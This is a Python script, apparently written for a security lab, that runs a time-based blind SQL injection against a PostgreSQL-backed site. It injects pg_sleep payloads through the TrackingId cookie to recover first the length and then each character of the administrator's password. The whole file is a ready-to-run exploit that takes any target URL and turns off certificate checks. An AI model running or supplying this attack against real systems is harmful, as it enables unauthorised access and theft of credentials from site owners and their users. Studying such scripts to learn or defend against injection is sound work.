import requests
from requests.utils import dict_from_cookiejar, cookiejar_from_dict
import sys
import concurrent.futures
import urllib3
urllib3.disable_warnings()

def generate_payload_LENGTH(length):
    return f"' ||  (SELECT CASE WHEN (LENGTH(password)={length}) THEN pg_sleep(5) ELSE '' END FROM users where username='administrator' )--"

def generate_payload_pass_char(char):
    return f"' ||  (SELECT CASE WHEN substring(password,{char[0]},1)='{char[1]}' THEN pg_sleep(5) ELSE '' END FROM users where username='administrator' )--"

def update_cookies(session,url,payload,cookies):
    cookies=cookies.copy()
    cookies['TrackingId']+=payload
    r=session.get(url,verify=False,timeout=10,cookies=cookies)
    return r

def sleep_time(session,cookies,url,generate_payload,vars):
    payload=generate_payload(vars)
    r=update_cookies(session,url,payload,cookies)
    if r.elapsed.total_seconds()>5:
        return True
    else:
        return False
    


if __name__=='__main__':
    try:
        url=sys.argv[1]
    except IndexError:
        print(f"[-] Syntax: python3 {sys.argv[0]} <url>")
        exit(-1)


s=requests.Session()
r=s.get(url,verify=False,timeout=5)
cookies=dict_from_cookiejar(s.cookies)
print("[+] determining number of chars...")
no_chars=0

for i in range(1,31):
    if sleep_time(s,cookies,url,generate_payload_LENGTH,i):
        no_chars=i
        break

print(f"[+] found : {no_chars}")
print("Start brute force attack...\nResult :")
results=[]
alpha_num="abcdefghijklmnopqrstuvwxyz0123456789"
pass_code=""
for i in range(1,no_chars+1):
    print(f"\t[%] THe {i} char : ",end="")
    for j in alpha_num:
        if sleep_time(s,cookies,url,generate_payload_pass_char,[i,j]):
            print(j)
            pass_code+=j
            break
print("Pass_code :",pass_code)